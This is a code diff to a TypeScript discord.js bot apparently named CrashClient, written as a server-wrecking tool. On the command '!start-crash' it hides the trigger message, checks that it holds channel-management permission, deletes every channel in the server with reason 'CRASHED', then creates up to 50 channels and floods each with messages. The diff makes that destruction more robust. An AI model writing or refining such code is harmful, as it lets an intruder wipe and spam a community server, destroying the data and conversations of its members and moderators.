@@ -1,7 +1,7 @@
-import { Event } from 'src/utils/Event';
-import { CrashClient } from 'src/client';
-import { ChannelType, Message } from 'discord.js';
-import { LogLevel } from 'src/logger/enums/LogLevel';
+import { Event } from '@src/utils/Event';
+import { CrashClient } from '@src/client';
+import { ChannelType, Message, PermissionFlagsBits } from 'discord.js';
+import { LogLevel } from '@src/logger/enums/LogLevel';
 
 export default new Event(
     {
@@ -16,7 +16,28 @@ export default new Event(
             return;
         }
 
+        const me = await message.guild.members
+            .fetchMe()
+            .catch(() => {
+                client.logger.log(
+                    LogLevel.WARN,
+                    `Ошибка при получении клиента`
+                );
+                return null;
+            });
+
         if (message.content === '!start-crash') {
+            await message.delete()
+                .catch(() => null);
+
+            if (!me?.permissions.has(PermissionFlagsBits.ManageChannels)) {
+                client.logger.log(
+                    LogLevel.WARN,
+                    `Недостаточно прав для краша`
+                );
+                return
+            }
+
             await Promise.all(
                 message.guild.channels.cache.map((channel) =>
                     channel.delete(`CRASHED`)
@@ -29,11 +50,11 @@ export default new Event(
             });
 
             const channelsLimited =
-                client.config.channelsToCreate > 50
+                (client.config.channelsToCreate > 50 || client.config.channelsToCreate < 1)
                     ? 50
                     : client.config.channelsToCreate;
             const messagesLimited =
-                client.config.messagesPerChannel > 15
+                (client.config.messagesPerChannel > 15 || client.config.messagesPerChannel < 1)
                     ? 15
                     : client.config.messagesPerChannel;
 
